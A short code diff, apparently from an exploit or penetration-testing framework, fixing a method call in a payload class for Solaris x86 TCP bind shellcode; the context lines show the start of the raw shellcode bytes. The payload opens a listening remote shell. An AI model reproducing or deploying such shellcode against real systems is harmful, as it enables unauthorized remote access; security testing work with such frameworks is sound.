@@ -6,7 +6,7 @@ class Payload(Shellcode):
     Shellcode.info["name"] = "Solarisx86 - tcp_bind shellcode"
 
     def __init__(self, **kwargs): 
-        Shellcode.info["size"] = 93 + Shellcode.getsize(kwargs["lport"])
+        Shellcode.info["size"] = 93 + Shellcode().getsize(kwargs["lport"])
         Shellcode.info["payload"] = [
             r"\x68\xff\xd8\xff\x3c\x6a\x65\x89\xe6\xf7\x56\x04\xf6\x16" 
             r"\x31\xc0\x50\x68\xff\x02"
